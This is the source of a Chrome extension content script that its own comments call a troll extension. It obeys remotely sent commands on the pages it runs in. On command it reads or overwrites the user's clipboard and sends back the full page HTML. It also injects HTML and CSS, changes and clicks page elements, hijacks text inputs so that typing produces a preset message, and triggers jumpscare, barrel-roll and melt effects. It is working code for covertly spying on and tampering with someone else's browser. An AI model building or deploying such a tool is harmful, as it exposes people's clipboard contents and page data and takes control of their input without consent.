chrome.runtime.onMessage.addListener(m => {
    console.log(m)
    if (m.type == "command") commandManager(m)
})

function send(m) {
    chrome.runtime.sendMessage(m)
}

function toJSON(str) {
    return str ? JSON.parse(str.replaceAll("\n","").replaceAll(/(?<=\{|,)\s*(['"])?[a-z0-9_$]+\1?\s*['"]?(?=:)/gi, x=>'"'+x.match(/[a-z0-9]+/gi)+'"')) : ""
}

// COMMANDS
function commandManager(m) {
    let c = m.command.trim().toLowerCase()
    try {
        if (c == "test") console.log("test:", m.value)
        else if (c.includes("clipboard")) clipboard(m)
        else if (c.includes("style")) style(m)
        else if (c.includes("html")) html(m)
        else if (c.includes("follow")) follow(m)
        else if (c.includes("forcefeed")) forcefeed(m)
        else if (c.includes("barrelroll")) createBarrelRoll(m)
        else if (c.includes("jumpscare")) createJumpscare(m)
        else if (c.includes("melt")) createMelt(m)
    } catch (err) {
        send({type:"response", isError:true, value:err.toString(), responseTarget:m.responseTarget})
    }
}

function clipboard(m) {
    let c = m.command.trim().toLowerCase()
    if (c.includes("get") || c.includes("read")) navigator.clipboard.readText().then(cb=>send({type:"response", command:c, value:cb, responseTarget:m.responseTarget}))
    if (c.includes("set") || c.includes("write")) {
        navigator.clipboard.writeText(m.value)
        send({type:"response", command:c, value:"Clipboard value is now set to: "+m.value, responseTarget:m.responseTarget})
    }
}
function style(m) {// {selector:"", css:"", activation:?"", id:""}
    let c = m.command.trim().toLowerCase()
    if (c.includes("create")) {
        let v = toJSON(m.value), els = document.querySelectorAll(v.selector),
        css = v.selector+(v.activation||"")+"{"+v.css+"}",
        style = document.createElement("style")
        style.id = v.id
    
        if (style.styleSheet) style.styleSheet.cssText = css
        else style.appendChild(document.createTextNode(css))

        els.forEach(el=>el.appendChild(style))
        
        send({type:"response", command:c, value:"New style appended, id: "+v.id+" ["+els.length+"]", responseTarget:m.responseTarget})
    } else if (c.includes("remove")) {
        let els = document.querySelectorAll("style"+m.value)
        els.forEach(el=>el.remove())
        send({type:"response", command:c, value:"Removed style with id: "+m.value+" ["+els.length+"]", responseTarget:m.responseTarget})
    }
}

function html(m) {// {tag:"", html:"", selector:"", prepend:false}
    let c = m.command.trim().toLowerCase()
    if (c.includes("get")) send({type:"response", isHTML:true, command:c, value:document.documentElement.outerHTML, responseTarget:m.responseTarget})
    else if (c.includes("create")) {
        let v = toJSON(m.value), els = document.querySelectorAll(v.selector),
        newEl = document.createElement(v.tag)
        newEl.innerHTML = v.html
        if (v.prepend) els.forEach(el=>el.prepend(newEl))
        else els.forEach(el=>el.appendChild(newEl))
        send({type:"response", command:c, value:"New element <"+v.tag+"> added to: "+v.selector+" ["+els.length+"]", responseTarget:m.responseTarget})
    } else if (c.includes("remove")) {//selector
        let els = document.querySelectorAll(m.value)
        els.forEach(el=>el.remove())
        send({type:"response", command:c, value:"Removed element: "+m.value+" ["+els.length+"]", responseTarget:m.responseTarget})
    } else if (c.includes("modify")) {// {selector:"", attr:[{textContent:"some text"}]}
        let v = toJSON(m.value), els = document.querySelectorAll(v.selector)
        els.forEach(el=>{
            v.attr.forEach(a=>{
                el[Object.keys(a)[0]] = Object.values(a)[0]
            })
        })
        send({type:"response", command:c, value:"Modified element: "+v.selector+" ["+els.length+"]", responseTarget:m.responseTarget})
    } else if (c.includes("action")) {// {selector:"", callback:"click"]}
        let v = toJSON(m.value), els = document.querySelectorAll(v.selector)
        els.forEach(el=>{
            el[v.callback]?.()
        })
        send({type:"response", command:c, value:"Executed '"+v.callback+"' on: "+v.selector+" ["+els.length+"]", responseTarget:m.responseTarget})
    }
}

function follow(m) {// top:90, right:0, bottom:270, left:180   |   {selector:"", offset:270}
    let v = toJSON(m.value), offset = v.offset??270, els = document.querySelectorAll(v.selector)
    els.forEach(el=>{
        let {x, y, width:w, height:h} = el.getBoundingClientRect(),
        fn = (e)=>el.style.transform=`rotate(${offset-Math.atan2(y+h/2-e.y, -(x+w/2-e.x))*180/Math.PI}deg)`
        window.addEventListener("mousemove",fn), fn
    })
    send({type:"response", command:m.command, value:v.selector+" is now following the mouse"+" ["+els.length+"]", responseTarget:m.responseTarget})
}

function forcefeed(m) {//deleteMode: 0(canDelete)|1(deleteAdds)|null(keep) // {selector:"", text:"", deleteMode:1}
    let mv = toJSON(m.value), message = mv.text||mv.message, deleteMode = mv.deleteMode||1, m_ll = message.length, els = document.querySelectorAll(mv.selector)
    els.forEach(el=>{
        let old = el.value, v = el.value = "", i=0
        el.ondragend=()=>el.value=old
        el.onselect=()=>document.getSelection().empty()
        el.oninput=(e)=>{
            let type = e.inputType
            v = el.value
            if (deleteMode==0 && type !== 'insertText') {// delete
                el.value = old.slice(0, old.length-1)
                i--//
            }
            else if (type !== 'insertText') el.value = old// prevent delete      
            if (type == 'insertText') el.value = v.slice(0, v.length-1)// prevent natural write
            if (i <= m_ll && ((deleteMode==1 && type.includes("deleteContent")) || type == 'insertText')) el.value += message.charAt(i++)// write
            old = el.value
        }
    })
    send({type:"response", command:m.command, value:mv.selector+" is now forcefeeding"+" ["+els.length+"]", responseTarget:m.responseTarget})
}




//// TROLL EXTENSION STUFF
function createBarrelRoll(m) { // {selector:"", delay:0, params:{duration:1000, count:1, direction:"normal"}}
    let v = toJSON(m.value),
    br = new BarrelRoll(v.params, document.querySelector(v.selector||"html"))

    setTimeout(() => {
        br.execute()
        send({type:"response", command:m.command, value:"Executed barrelroll", responseTarget:m.responseTarget})
    }, v.delay||0);
}

function createJumpscare(m) { // {delay:0, params:{duration:1000, filename:"icon.png"}, selector?:""}
    let v = toJSON(m.value),
    j = new Jumpscare(v.params, document.querySelector(v.selector||"html"))

    setTimeout(() => {
        j.execute()
        send({type:"response", command:m.command, value:"Executed jumpscare", responseTarget:m.responseTarget})
    }, v.delay||0);
}

function createMelt(m) { // {delay:0, params:{duration:1000}, selector?:"" }
    let v = toJSON(m.value),
    melt = new Melt(v.params, document.querySelector(v.selector||"html"))

    setTimeout(() => {
        melt.execute()
        send({type:"response", command:m.command, value:"Executed melt", responseTarget:m.responseTarget})
    }, v.delay||0);
}

class BarrelRoll {
    constructor(params, el = document.querySelector("html")) {
        this._id = "TE_BARRELROLL"
        this._p = {t:params?.duration??1000, c:params?.count??1, d:params?.direction??"normal"}
        this._el = el||document.querySelector("html")
        this._style = this.createStyle()
    }

    createStyle() {
        let s = document.createElement("style")
        s.appendChild(document.createTextNode(`
        [${this._id}="true"] {
            animation-name: barrelRoll;
            animation-duration: ${this._p.t/this._p.c}ms;
            animation-iteration-count: ${this._p.c};
            animation-direction: ${this._p.d};
            animation-timing-function: linear;
        }`))
        return s
    }

    execute(delay=0) {
        setTimeout(()=>{
            this._el.setAttribute(this._id, "true")
            document.querySelector("head").appendChild(this._style)
            this.stop(this._p.t||DEFAULT_DURATION)
        },delay)
    }

    stop(delay=0) {
        setTimeout(()=>{
            this._el.removeAttribute(this._id)
            this._style.remove()
        }, delay)
    }
}

class Jumpscare {
    constructor(params, el = document.querySelector("html")) {
        this._id = "TE_JUMPSCARE"
        this._p = {t:params?.duration??1000, filename:params?.filename??"icon.png"}
        this._el = el||document.querySelector("html")
        this._img
        this._style = this.createStyle()
    }

    createStyle() {
        let s = document.createElement("style")
        s.appendChild(document.createTextNode(`
        [${this._id}="true"] {
            animation-name: jumpScare;
            animation-duration: ${this._p.t}ms;
            animation-iteration-count: 1;
            animation-direction: normal;
            animation-timing-function: linear;
        }`))
        return s
    }

    execute(delay=0) {
        setTimeout(() => {
            this._img = document.createElement("img")
            this._img.setAttribute(this._id, "true")
            this._img.src = chrome.runtime.getURL("/img/"+this._p.filename)
            this._el.scrollTo(0,0)
            this._el.prepend(this._img)
            document.querySelector("head").appendChild(this._style)
            

            this.stop(this._p.t||DEFAULT_DURATION)
        }, delay);
    }

    stop(delay=0) {
        setTimeout(()=>{
            this._style.remove()
            this._img.remove()
        }, delay)
    }
}

class Melt {
    constructor(params, el = document.querySelector("html")) {
        this._id = "TE_MELT"
        this._p = {t:params?.duration??1000}
        this._el = el||document.querySelector("html")
        this._svg = this.createFilter()
        this._style = this.createStyle()
    }

    createFilter() {
        let svg = document.createElement("svg")
        svg.innerHTML = `
        <filter id="TE_MELT_SVG">
          <feTurbulence id="_M" type="turbulence" numOctaves="50" result="NOISE"></feTurbulence>
          <feDisplacementMap in="SourceGraphic" in2="NOISE" scale="50"></feDisplacementMap>
          <animate xlink:href="#_M" attributeName="baseFrequency" dur="30s" keyTimes="0;0.5;1"
          values="0.01 0.02;0.02 0.04;0.01 0.02" repeatCount="indefinite"></animate>
        </filter>`
        return svg
    }

    createStyle() {
        let s = document.createElement("style")
        s.appendChild(document.createTextNode(`
        [${this._id}="true"] {
            animation-name: melt;
            animation-duration: ${this._p.t}ms;
            animation-iteration-count: 1;
            animation-direction: normal;
            animation-timing-function: ease;
        }`))
        return s
    }

    execute(delay=0) {
        setTimeout(()=>{
            this._el.setAttribute(this._id, "true")
            document.querySelector("head").appendChild(this._svg)
            document.querySelector("head").appendChild(this._style)
            this.stop(this._p.t||DEFAULT_DURATION)
        },delay)
    }

    stop(delay=0) {
        setTimeout(()=>{
            this._el.removeAttribute(this._id)
            this._svg.remove()
            this._style.remove()
        }, delay)
    }
}
